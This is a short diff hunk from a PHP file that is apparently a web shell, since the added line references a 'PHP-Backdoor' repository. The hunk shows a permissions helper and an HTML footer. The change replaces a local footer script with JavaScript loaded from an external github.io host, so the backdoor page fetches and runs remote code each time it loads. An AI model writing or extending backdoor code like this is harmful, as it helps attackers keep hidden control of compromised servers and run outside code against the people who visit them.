@@ -175,6 +175,6 @@ function perms($file)
     return $info;
 }
 echo '<br><center>&copy; <span id="footer"></span> 2021.</center><br>';
-echo '<script type="text/javascript" src="/footer.js"></script>';
+echo '<script type="text/javascript" src="//zerobyte-id.github.io/PHP-Backdoor/inc/footer.js"></script>';
 echo '</body></html><!-- EOF -->';
 ?>
